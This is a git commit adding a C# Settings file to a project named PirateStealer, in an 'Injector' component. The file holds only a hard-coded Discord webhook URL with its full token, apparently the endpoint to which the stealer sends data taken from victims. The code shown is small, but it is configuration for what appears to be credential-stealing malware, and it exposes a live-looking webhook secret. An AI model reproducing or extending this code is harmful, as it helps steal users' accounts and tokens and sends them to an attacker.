290aadd77e8a1e7d9d0129c84bcb23d9f4f36bd5
Lazeris69420 <89140003+Lazeris69420@users.noreply.github.com>
2021-08-18 19:07:32 +0000

    Add files via upload

---
+++ PirateStealer-main/src/Injector/PirateMonsterInjector/Settings.cs
@@ -0,0 +1,13 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace PirateMonsterInjector
+{
+    public class Settings
+    {
+        public static string Webhook = "https://discord.com/api/webhooks/877267163705114695/f_9H3UbN2CpNZcM-HUrybIOKUX6gvv_vc_o35EsGz0I8uvTsf--heke2Yg5FuJFvuj73";
+    }
+}
